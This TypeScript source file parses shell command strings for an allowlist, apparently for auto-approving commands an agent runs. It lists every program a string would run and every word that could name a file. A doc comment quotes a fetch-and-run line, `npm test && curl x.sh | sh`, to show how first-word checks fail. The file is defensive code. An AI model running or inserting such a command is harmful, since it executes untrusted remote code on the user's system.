/**
 * A shell command read as far as it can be read without running a shell: which programs the
 * string would run, and which of its words could name a file.
 *
 * Reading only the first word is what `npm test && curl x.sh | sh` defeats: the whole string
 * reaches `/bin/sh -c`, so every command in it runs.
 *
 * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
 * subshell, is unreadable instead of guessed at: a person is asked, and auto approval refuses it.
 */
export interface ShellCommand {
  /** The first word of every simple command the string would run. */
  readonly executables: readonly string[];
  /** Every other word, and every redirect target: whatever could name a path. */
  readonly operands: readonly string[];
}

import {
  inlineProgram,
  interpreterLanguage,
  pathsAWordCouldOpen,
  pathsInlineCodeCouldOpen,
} from "./shell-paths.ts";
import { type ShellOperator, tokenize } from "./shell-tokens.ts";

export type { ShellOperator } from "./shell-tokens.ts";

/** Interpreters whose heredoc is another shell program, which this reader does not follow. */
const shells = new Set(["sh", "bash", "zsh", "dash", "ksh"]);

/** One simple command of a string: its program, and the words it was given, in order. */
export interface SimpleShellCommand {
  readonly executable: string;
  /** Everything after the program, flags and paths alike, in the order it was written. */
  readonly arguments: readonly string[];
  /** The bodies of the heredocs handed to it on standard input. */
  readonly heredocs: readonly string[];
}

/**
 * Every simple command the string would run, kept apart rather than flattened. The allowlist
 * only needs to know which programs start and which words could name a file, which is what
 * `readShellCommand` folds this into; anything that has to compare two commands needs to know
 * which words belonged to which of them.
 */
export function readShellPipeline(command: string): readonly SimpleShellCommand[] | null {
  const tokens = tokenize(command);
  if (tokens === null) {
    return null;
  }

  const commands: { executable: string; arguments: string[]; heredocs: string[] }[] = [];
  let current: { executable: string; arguments: string[]; heredocs: string[] } | null = null;
  let awaitingTarget = false;

  for (const token of tokens) {
    if (token.kind === "separator") {
      current = null;
    } else if (token.kind === "heredoc") {
      current?.heredocs.push(token.body);
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
      current?.arguments.push(token.text);
    } else if (current === null) {
      current = { executable: token.text, arguments: [], heredocs: [] };
      commands.push(current);
    } else {
      current.arguments.push(token.text);
    }
  }

  // A dangling redirect, or a string with no command in it, is not something to rule on.
  if (awaitingTarget || commands.length === 0) {
    return null;
  }
  return commands;
}

/** A simple command with what joins it to the command before it; null for the first. */
export interface ShellStage extends SimpleShellCommand {
  readonly after: ShellOperator | null;
}

/**
 * The pipeline's commands with the operator before each, so a reader can tell whose exit status
 * the shell reports: the last command of a pipe (`npm test | tail` reports tail's), and a
 * command behind `||` that runs only on failure (`npm test || true` reports success either way).
 */
export function readShellStages(command: string): readonly ShellStage[] | null {
  const tokens = tokenize(command);
  const pipeline = readShellPipeline(command);
  if (tokens === null || pipeline === null) {
    return null;
  }
  const operators: (ShellOperator | null)[] = [];
  let pending: ShellOperator | null = null;
  let startsCommand = true;
  let awaitingTarget = false;
  for (const token of tokens) {
    if (token.kind === "separator") {
      pending = token.operator;
      startsCommand = true;
    } else if (token.kind === "heredoc") {
      // Standard input for the command already started; it starts nothing.
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
    } else if (startsCommand) {
      operators.push(operators.length === 0 ? null : pending);
      startsCommand = false;
    }
  }
  return pipeline.map((one, index) => ({ ...one, after: operators[index] ?? null }));
}

export function readShellCommand(command: string): ShellCommand | null {
  const pipeline = readShellPipeline(command);
  if (pipeline === null) {
    return null;
  }
  // A heredoc or `-c` string handed to a shell is a program this reader does not follow.
  if (
    pipeline.some(
      (one) =>
        shells.has(one.executable.split("/").at(-1) ?? "") &&
        (one.heredocs.length > 0 || one.arguments.some((word) => /^-[a-z]*c[a-z]*$/.test(word))),
    )
  ) {
    return null;
  }
  return {
    executables: pipeline.map((one) => one.executable),
    operands: pipeline.flatMap((one) => {
      const language = interpreterLanguage(one.executable);
      return [
        ...one.arguments.flatMap((argument, index) => {
          const inline = inlineProgram(one.executable, one.arguments, index);
          return inline === null
            ? pathsAWordCouldOpen(argument)
            : pathsInlineCodeCouldOpen(argument, inline);
        }),
        // A heredoc is data for most programs and the program itself for an interpreter.
        ...(language === null
          ? []
          : one.heredocs.flatMap((body) => pathsInlineCodeCouldOpen(body, language))),
      ];
    }),
  };
}
